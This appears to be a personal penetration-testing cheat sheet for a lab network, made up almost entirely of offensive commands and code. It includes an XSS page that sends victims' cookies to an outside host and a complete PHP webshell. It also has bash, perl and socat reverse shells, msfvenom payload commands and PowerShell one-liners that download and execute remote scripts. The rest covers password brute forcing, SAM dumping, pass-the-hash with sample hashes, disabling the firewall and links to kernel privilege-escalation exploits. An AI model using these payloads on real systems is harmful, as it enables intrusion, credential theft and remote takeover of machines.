

awk '{print $1}' scans/arp-scan-10.1.1.0.txt | sort -u | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
for ip in $(cat scans/ips.txt);do nmap -Pn $ip -p 80 -oG -;done >> scans/80.txt
awk '/open/ {print $2}' scans/80.txt


for ip in $(cat ./ips.txt);do nmap -Pn $ip -p 443 -oG -;done >> ./443.txt 
awk '/open/ {print $2}' ./443.txt 

PORT SCAN
nmap 10.1.1.1 -A -Pn -p $(echo $(unicornscan $ip:1-65535 | cut -d"]" -f1 | cut -d"[" -f2) | sed 's| |,|g')
nmap 10.1.1.1 -A -Pn -sU -p $(echo $(unicornscan -mU $ip:1-65535 | cut -d"]" -f1 | cut -d"[" -f2) | sed 's| |,|g')
execute -f sl.exe -i -a '-vpt1-65535 10.1.1.200' **bad with udp
./detailPortScan.sh 10.1.1.200
nc -vnz 10.1.1.200 1-65535
nc -vnzu 10.1.1.200 1-65535
unicornscan 10.1.1.200:1-65535 
unicornscan -mU 10.1.1.200:1-65535

MISC
msfvenom -p /bsd/x64/shell_reverse_tcp LPORT=443 LHOST=10.1.1.100 -f elf > rev-443-bsd-x64
cat rev-443-bsd-x64 | ruby -ne '$_.each_byte{|b| print "\\x%02x"%b}'
perl -e 'print”..\xshell_code\x..”’ > /usr/local/databases/rev-443-bsd-x64

RDP
ncrack -u admin -P ./lab.pass rdp://127.0.0.1,CL=1 -v
ncrack --pairwise -U ./lab.user -P ./lab.pass rdp://10.1.1.200,CL=1 -v
**crowbar,hydra,medusa returns false po/negaitive
 
TUNELLING
ssh root@10.1.1.100 -R 631:10.1.1.200:631
ssh -f -N root@10.1.1.100 -R 631:10.1.1.200:631
meterpreter > portfwd add -l 631 -r 10.1.1.200 -p 631
route add 10.10.10.0 255.255.255.0   1
execute -f plink.exe -i -a '-l root -pw pass1234 -R 135:10.1.1.200:135 10.1.1.100
execute -f plink.exe -i -a 'root@10.1.1.100 -pw pass1234 -R 135:10.1.1.200:135'

Proxychain
ssh mee@10.1.1.100 -Nq -D 9050
proxychains nmap 2.2.2.2

running service < centos6
run=($(runlevel));chkconfig --list| grep "${run[1]}:on"

HTTP/S
webdav
cadaver http://10.1.1.200/

Default pass for various services
grep -i phpmy /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv

Nikto -H for more options

#-e tells its to enum instead of just informative
wpscan -e -u http://10.1.1.200

nikto -h 10.1.1.200

gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x html,txt,js,asp,php -u http://10.1.1.200

XSS
<html>
<body onload='document.location.replace("http://10.1.1.100:444/post.asp?name=victim1&message =" + document.cookie + "<br>" + "URL:" + document.location);'>
</body>
</html>

My PHP webshell
<?php
$script = $_SERVER['SCRIPT_NAME'];

//form execure cmd
echo"$script?cmd=shell_cmd <br>works too :P<br>
//if no action=page_to_go is specify, form is submit to itself
<form method='post'> 			
cmd: <input type='text' name='cmd'>
<input type='submit' name='postExe'>
</form>
";

//form upload file
echo"
<form method='post' enctype='multipart/form-data'>
Upload File to /tmp/: <input type='file' name='uploadFile'><br>
<input type='submit' name='postFile' value='upload me :D'>
</form><br>
";

//GET execute
echo"<pre>";
echo shell_exec($_GET['cmd']);
echo"</pre>";

//POST execute
if(isset($_POST['postExe'])){
  echo"<pre>";
  echo shell_exec($_POST['cmd']);
  echo"</pre>";
}

//upload file
if(isset($_POST['postFile'])){
  move_uploaded_file($_FILES['uploadFile']['tmp_name'], '/tmp/'.$_FILES['uploadFile']['name']);
}
?>
PHP rev Shell
<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.12/443 0>&1'\") ?>

MYSQL
mysql -u root -pzaq1xsw2cde3 -D wingnut -e 'show tables;'
mysql -u root -pzaq1xsw2cde3 -e 'select * from wingnut.bigtree_users;'

CURL 
methods/others
options -> curl -i -X OPTIONS http://10.0.0.10
head -> curl -I http://10.0.0.10	#--head, -i -X HEAD
put -> curl -T ./testFile.pdf http://10.0.0.10/myPhp/fileUpload.php	#--upload-file
post(data login) -> curl -i -d "user=user1&pass=pass1" http://10.0.0.10/myPhp/html/index.php?page=login | html2text
post(multipart/form-data) -> curl -i -F stuff=@./testFile.pdf http://10.0.0.10/myPhp/fileUpload.php
post(upload bypass MIME check) -> curl -F "stuff=@./test.php;type=image/jpeg" http://10.0.0.10/myPhp/fileUpload.php
get(PHPSESSID) -> curl -i -b "PHPSESSID=sf01t0o92eo1vqnb7cdhqba4lc" http://10.0.0.10/myPhp/html/index.php?page=our_client | html2text
headers -> curl -d "param1=value1&param2=value2" -H "Content-Type: application/x-www-form-urlencoded"
spoof agent as google spider
curl http://10.1.1.200/robots.txt -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')"
banner grab
echo HEAD / HTTP/1.0\r\n\r\n | nc -vn 10.1.1.200 22

ON/OFF PASS BRUTE
john incremental mode 6-8 char
john --incremental --min-len=6 --max-len=8 ./bla.shadow
crunch  4 4 0123456789 | john --stdin ./sth.shadow
cewl -d 3 http://10.1.1.200/wp/ -w pass.cewel

mangle rules, gen mangle password
###my3digit rule
[List.Rules:3digit]
$[1-9]$[1-9]$[1-9]

john --wordlist=./pass.cewel --rule=3digit --stdout

hydra -l admin -P /usr/share/wordlists/fasttrack.txt 10.1.1.200 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.1.1.200%2Fwp-admin%2F&testcookie=1:ERROR'
https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/

POWERSHELL
powershell.exe -ExecutionPolicy Bypass -NoExit -File met-rev-444.ps1
***by default PS script execute is diable so use -> -ExecutionPolicy Bypass
***powershell.exe exits after it executes the PS script, so the loaded meterpreter paylaod gets kill, so use -NoExit
powershell wget
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.1.1.100/met-rev-443.ps1','C:\HFS\met-rev-443.ps1')"
powershell curl
powershell -c "(new-object System.Net.WebClient).Downloadstring('http://10.1.1.100/getme.txt')"
oneline download+execute
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.1.1.100/stuff.bat'))"
widh these would work??
PsExec.exe -u alice -p alicepass -i powershell -ExecutionPolicy Bypass -NoExit -File C:\HFS\rev-442.ps1
PsExec.exe -u alice -p alicepass powershell -c "(new-object System.Net.WebClient).Downloadstring('http://10.1.1.100/getme.txt')"
powershell -c '$pass = ConvertTo-SecureString -AsPlainText "alicepass" -Force; $Cred = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList "alice", $pass; $Session = New-PSSession -ComputerName "127.0.0.1" -credential $Cred; Invoke-Command -Session $Session -Scriptblock {C:\HFS\rev-443.ps1}'

schtasks
schtasks /create /tn bla /tr C:\Users\bob.win7Pro64\Desktop\pipe.exe /sc onidle /i 1
schtasks /query /tn bla
schtasks /run /tn bla
schtasks /s 10.1.1.9 /create /tn bla /tr C:\windows/system32/ipconfig.exe /sc onidle /i 1 /u administrator /p superSecret

wmic
wmic /node:10.1.1.9 /user:administrator /password:superSecret /authlevel:call useraccount get sid

MSFVENOM
msfvenom -p windows/meterpreter/reverse_tcp LPORT=444 LHOST=10.1.1.100 -f psh > met-rev-444.ps1

get OS specific oneline revere shell
msfvenom -l payload | grep -P 'cmd/(unix|windows)' | awk '{print $1}'
root@kali:~/Desktop# msfvenom -p cmd/unix/reverse_perl LPORT=443 LHOST=10.1.1.11
...
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.1.1.11:443");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'

LINUX PRIVESC
CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
https://www.exploit-db.com/exploits/15285/
Linux Kernel <= 2.6.37 'Full-Nelson.c'
https://www.exploit-db.com/exploits/15704/
CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
https://git.zx2c4.com/CVE-2012-0056/tree/mempodipper.c
CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
https://dirtycow.ninja
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
Linux 2.6.32
https://www.exploit-db.com/exploits/15285/

great priv esc source
https://guif.re/linuxeop

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
python -c 'import pty;pty.spawn("/bin/bash")'
CTRL-z
stty raw -echo
fg

to get back
stty -raw echo

getting a real tty shell(where vi, tab, etc works)
https://dominicbreuker.com/post/htb_solidstate/
On the remote machine, run python -c 'import pty; pty.spawn("bash")'
press CTRL-z to put the NC session to the background.
Then run stty -a to print out information about your shell. Note the rows and columns (say they are 40 and 160 respectively).
Now run stty raw -echo to put your shell into raw mode and echo off, 
then fg NC session back, and reset the shell. 
If you get asked for the type of the terminal, use xterm-256color.
After that, run stty rows 40 columns 160 to specify the correct size. 
You should now have a fully working shell, in particular vi should work.
or use socat
download static x64 from wget  https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:10.0.0.17:444
socat file:`tty`,raw,echo=0 tcp-listen:444

gcc -m32 -Wl,--hash-style=both

find / -perm -2 -type f -ls 2>/dev/null | grep -v proc
find / -perm -2 ! -type l -ls 2>/dev/null | grep -v proc
find / -perm -4 -type f -ls 2>/dev/null | grep -P '\.conf$'
find / -perm -004 -user root -type f -ls 2>/dev/null 
find / -perm -2 -user root -type f -ls 2>/dev/null | grep -v /proc
find / -perm -4000 -user root -type f -ls 2>/dev/null 
find / -perm -2000 -user root -type f -ls 2>/dev/null
find / ! -perm -4 -user root ! -type l -ls 2>/dev/null | egrep -v "(proc|dev)"
find / -iname id_rsa -type f -ls 2>/dev/null
find / -iname id_dsa -type f -ls 2>/dev/null
grep -iR password /etc/*
netstat -lnp
find port/process
lsof -i :80 
fuser 80/tcp
crontab -l
ls -l /etc/cron.*/ 2>/dev/null
ls -l /var/backups/
sudo -l
/etc/exports -> add no_root_squash path with noput SUID, exec to root
ps aux | grep root | awk '{print $11}' | xargs -r ls -l 2>/dev/null | sort -u
ls -al /var/mail/
ls -al /var/spool/mail/

priv check scripts
wget http://www.securitysift.com/download/linuxprivchecker.py
wget https://github.com/pentestmonkey/unix-privesc-check
wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh

WIN PRIVESC
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg save hklm\sam sam
reg save hklm\system system
samdump2 system sam
show all files/folder with write permission for user type
accesschk.exe -swu "Authenticated Users" c:\*
accesschk.exe -swu users c:\*
accesschk.exe -swu "Everyone" c:\*
accesschk.exe -wc "*" | findstr /v Admin | findstr /v SYSTEM
accesschk.exe -vc upnphost

Awesome precompiled WIN EXE, tested MS11-080.exe -O 2K3 works!!
https://github.com/abatchy17/WindowsExploits

FIREWALL
netsh firewall set opmode mode=DISABLE
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off


METERPRETER POST
run post/windows/gather/dumplinks
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
use post/multi/recon/local_exploit_suggester

SMB/PTH/BRUTE
pth-smbclient -U Administrator%aad3b435b51404eeaad3b435b51404ee:a433f6c2b0d8bb92d7288ecffacfc7cd //10.1.1.200/C$ -c "put backdoors/met-rev-5000.exe met-rev-5000.exe"
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:a433f6c2b0d8bb92d7288ecffacfc7cd //10.1.1.200 "C:\\met-rev-5000.exe" --system
smbclient -U 'myadmin%pass1234!' //127.0.0.1/C$ -c "put met-rev-444.exe met-rev-444.exe"
winexe -U 'myadmin%pass1234!' //127.0.0.1 "C:\\met-rev-444.exe" --system
crackmapexec 10.1.1.200/24 -u Administrator -H ./administrator.hash --local-auth

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6d3448b44472bc42b065e6fcd94d7922  Administrator@10.1.1.200
like psexec, but dont drop exe on target, adn more less interactive
smbexec.py 'bla:pass1234!'@10.1.1.200
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:6d3448b44472bc42b065e6fcd94d7922 //10.1.1.200 cmd.exe

to fix /bin/sh^M: bad interpreter:
open file with vi
:set fileformat=unix
:wq!

somwhow dos2unix does not owrk

oneline servers
python -m SimpleHTTPServer 8000
python -m smtpd -n -c DebuggingServer 10.0.0.9:25
